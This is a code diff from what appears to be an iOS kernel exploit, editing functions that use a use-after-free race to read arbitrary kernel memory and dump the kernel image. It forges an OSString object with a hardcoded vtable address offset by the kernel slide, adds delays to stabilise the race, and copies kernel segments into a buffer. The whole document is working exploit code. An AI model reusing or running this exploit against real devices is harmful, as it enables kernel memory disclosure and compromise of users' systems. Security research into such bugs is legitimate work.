@@ -3,6 +3,7 @@
 #include <stdint.h>             // uint32_t
 #include <stdlib.h>             // malloc
 #include <string.h>             // memset, strerror
+#include <unistd.h>             // usleep
 
 #include "common.h"             // ASSERT, DEBUG, ERROR, PRINT_BUF, ADDR, addr_t, MACH_MAGIC, mach_hdr_t, mach_seg_t
 #include "io.h"                 // MIG_MSG_SIZE, kOS*, OSString, dict_get_bytes
@@ -76,24 +77,29 @@ void uaf_read(const char *addr, char *buf, size_t len)
     size_t kslide = get_kernel_slide();
     OSString osstr =
     {
-        .vtab = (void*)(0xffffff80044ef1f0 + kslide),   // TODO: hardcoded
+        .vtab = (vtab_t)(0xffffff80044ef1f0 + kslide),  // TODO: hardcoded
         .retainCount = 100,                             // don't try to free this
         .flags = kOSStringNoCopy,                       // and neither the "string" it points to
     };
 
+    verbose = false;
     for(size_t off = 0; off < len; off += osstr.length)
     {
         osstr.length = len - off;
         osstr.length = osstr.length > MIG_MSG_SIZE ? MIG_MSG_SIZE : osstr.length;
-        osstr.string = (const char*)addr + off;
+        osstr.string = &addr[off];
         //DEBUG(ADDR " %08x", (addr_t)osstr.string, osstr.length);
-        //verbose = false;
-        uaf_get_bytes(&osstr, buf, osstr.length);
-        //verbose = true;
+        //fprintf(stderr, "\r" ADDR " %08x", (addr_t)osstr.string, osstr.length);
+        // For some reason we have to slow the process down artificially in order to gain stability.
+        // I guess this has something to do with the UaF being a race condition.
+        usleep(100);
+        uaf_get_bytes(&osstr, &buf[off], osstr.length);
     }
+    verbose = true;
+    //fprintf(stderr, "\n");
 }
 
-file_t uaf_dump_kernel()
+void uaf_dump_kernel(file_t *file)
 {
     DEBUG("Dumping kernel...");
 
@@ -107,7 +113,8 @@ file_t uaf_dump_kernel()
 
     char *kbase = (char*)(0xffffff8004004000 + get_kernel_slide());
     uaf_read(kbase, hbuf, MIG_MSG_SIZE);
-    PRINT_BUF("Kernel header", (uint32_t*)hbuf, MIG_MSG_SIZE);
+    //uint32_t *header = (uint32_t*)hbuf;
+    //PRINT_BUF("Kernel header", header, MIG_MSG_SIZE);
 
     mach_hdr_t *hdr = (mach_hdr_t*)hbuf;
     ASSERT(MACH_MAGIC == hdr->magic);
@@ -117,6 +124,7 @@ file_t uaf_dump_kernel()
     newhdr->sizeofcmds = 0;
 
     size_t filesize = 0;
+    DEBUG("Kernel segments:");
     for(mach_cmd_t *cmd = (mach_cmd_t*)&hdr[1], *end = (mach_cmd_t*)((char*)cmd + hdr->sizeofcmds); cmd < end; cmd = (mach_cmd_t*)((char*)cmd + cmd->cmdsize))
     {
         switch(cmd->cmd)
@@ -127,11 +135,18 @@ file_t uaf_dump_kernel()
                     mach_seg_t *seg = (mach_seg_t*)cmd;
                     size_t size = seg->fileoff + seg->filesize;
                     filesize = size > filesize ? size : filesize;
+                    DEBUG("Mem: " ADDR "-" ADDR " File: " ADDR "-" ADDR "     %-31s", seg->vmaddr, seg->vmaddr + seg->vmsize, seg->fileoff, seg->fileoff + seg->filesize, seg->segname);
+                    for(uint32_t i = 0; i < seg->nsects; ++i)
+                    {
+                        mach_sec_t *sec = &( (mach_sec_t*)&seg[1] )[i];
+                        DEBUG("    Mem: " ADDR "-" ADDR " File: " ADDR "-" ADDR " %s.%-*s", sec->addr, sec->addr + sec->size, (addr_t)sec->offset, sec->offset + sec->size, sec->segname, (int)(30 - strlen(sec->segname)), sec->sectname);
+                    }
                 }
                 break;
         }
     }
 
+    DEBUG("Kernel file size: 0x%lx", filesize);
     char *buf = malloc(filesize);
     if(buf == NULL)
     {
@@ -147,23 +162,19 @@ file_t uaf_dump_kernel()
             case LC_SEGMENT_64:
                 {
                     mach_seg_t *seg = (mach_seg_t*)cmd;
-                    if((seg->flags & SG_NORELOC) != 0)
-                    {
-                        DEBUG("Skipping %s...", seg->segname);
-                        break;
-                    }
-                    DEBUG("%-16s vmaddr: " ADDR " vmsize: " ADDR " fileoff: " ADDR " filesize: " ADDR, seg->segname, seg->vmaddr, seg->vmsize, (addr_t)(kbase + seg->fileoff), seg->filesize);
+                    DEBUG("Dumping %s...", seg->segname);
                     uaf_read((char*)seg->vmaddr, &buf[seg->fileoff], seg->filesize);
-                    //uaf_read(kbase + seg->fileoff, &buf[seg->fileoff], seg->filesize);
                 }
             case LC_UUID:
             case LC_UNIXTHREAD:
             case LC_VERSION_MIN_IPHONEOS:
             case LC_FUNCTION_STARTS:
             case LC_SOURCE_VERSION:
-                memcpy(newhbuf + sizeof(*hdr) + newhdr->sizeofcmds, cmd, cmd->cmdsize);
-                newhdr->sizeofcmds += cmd->cmdsize;
-                newhdr->ncmds++;
+                {
+                    memcpy(newhbuf + sizeof(*hdr) + newhdr->sizeofcmds, cmd, cmd->cmdsize);
+                    newhdr->sizeofcmds += cmd->cmdsize;
+                    newhdr->ncmds++;
+                }
                 break;
         }
     }
@@ -175,8 +186,10 @@ file_t uaf_dump_kernel()
     free(hbuf);
     free(newhbuf);
 
-    return (file_t) {
+    file->buf = buf;
+    file->len = filesize;
+    /*return (file_t) {
         .buf = buf,
         .len = filesize,
-    };
+    };*/
 }
